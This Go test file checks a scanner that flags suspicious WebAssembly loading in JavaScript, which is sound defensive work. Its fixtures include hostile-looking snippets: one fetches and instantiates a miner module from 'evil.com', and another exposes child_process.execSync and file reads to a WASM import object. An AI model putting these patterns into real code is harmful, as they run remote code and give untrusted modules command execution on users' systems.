package analyzer

import (
	"strings"
	"testing"
)

func TestWasmPayload_Instantiate(t *testing.T) {
	a := NewWasmPayloadAnalyzer()
	content := `
const wasmBuffer = fs.readFileSync('./payload.wasm');
const module = await WebAssembly.instantiate(wasmBuffer);
module.instance.exports.run();
`
	findings := a.scanContent(content, "loader.js")

	found := false
	for _, f := range findings {
		if strings.Contains(f.Title, "WebAssembly module instantiation") {
			found = true
			break
		}
	}
	if !found {
		t.Error("Expected to detect WebAssembly instantiation")
	}
}

func TestWasmPayload_CompileStreaming(t *testing.T) {
	a := NewWasmPayloadAnalyzer()
	content := `
const module = await WebAssembly.compileStreaming(fetch('/evil.wasm'));
`
	findings := a.scanContent(content, "stream.js")

	found := false
	for _, f := range findings {
		if strings.Contains(f.Title, "WebAssembly module instantiation") {
			found = true
			break
		}
	}
	if !found {
		t.Error("Expected to detect WebAssembly compileStreaming")
	}
}

func TestWasmPayload_FromBase64(t *testing.T) {
	a := NewWasmPayloadAnalyzer()
	content := `
const wasmBytes = Buffer.from('AGFzbQEAAAA...', 'base64');
const module = await WebAssembly.instantiate(wasmBytes);
`
	findings := a.scanContent(content, "b64wasm.js")

	found := false
	for _, f := range findings {
		if strings.Contains(f.Title, "encoded data") {
			found = true
			if f.Severity != SeverityCritical {
				t.Errorf("Expected critical severity, got %d", f.Severity)
			}
			break
		}
	}
	if !found {
		t.Error("Expected to detect WASM from encoded data")
	}
}

func TestWasmPayload_RemoteLoading(t *testing.T) {
	a := NewWasmPayloadAnalyzer()
	content := `
const response = await fetch('https://evil.com/miner.wasm');
const wasmModule = await WebAssembly.instantiate(await response.arrayBuffer());
`
	findings := a.scanContent(content, "remote.js")

	found := false
	for _, f := range findings {
		if strings.Contains(f.Title, "Remote WASM") {
			found = true
			break
		}
	}
	if !found {
		t.Error("Expected to detect remote WASM module loading")
	}
}

func TestWasmPayload_SystemAccessImport(t *testing.T) {
	a := NewWasmPayloadAnalyzer()
	content := `
const importObject = {
  env: {
    exec: (cmd) => require('child_process').execSync(cmd),
    readFile: (path) => fs.readFileSync(path),
  }
};
const module = await WebAssembly.instantiate(wasmBytes, importObject);
`
	findings := a.scanContent(content, "imports.js")

	found := false
	for _, f := range findings {
		if strings.Contains(f.Title, "system access") {
			found = true
			if f.Severity != SeverityCritical {
				t.Errorf("Expected critical severity, got %d", f.Severity)
			}
			break
		}
	}
	if !found {
		t.Error("Expected to detect WASM import with system access")
	}
}

func TestWasmPayload_FileReference(t *testing.T) {
	a := NewWasmPayloadAnalyzer()
	content := `
const wasmPath = path.join(__dirname, 'crypto.wasm');
`
	findings := a.scanContent(content, "path.js")

	found := false
	for _, f := range findings {
		if strings.Contains(f.Title, "WASM file reference") {
			found = true
			break
		}
	}
	if !found {
		t.Error("Expected to detect WASM file reference")
	}
}

func TestWasmPayload_CleanCode(t *testing.T) {
	a := NewWasmPayloadAnalyzer()
	content := `
const express = require('express');
const app = express();
app.get('/api/data', (req, res) => res.json({ ok: true }));
app.listen(3000);
`
	findings := a.scanContent(content, "server.js")
	for _, f := range findings {
		if f.Severity >= SeverityHigh {
			t.Errorf("Unexpected high severity finding in clean code: %s", f.Title)
		}
	}
}
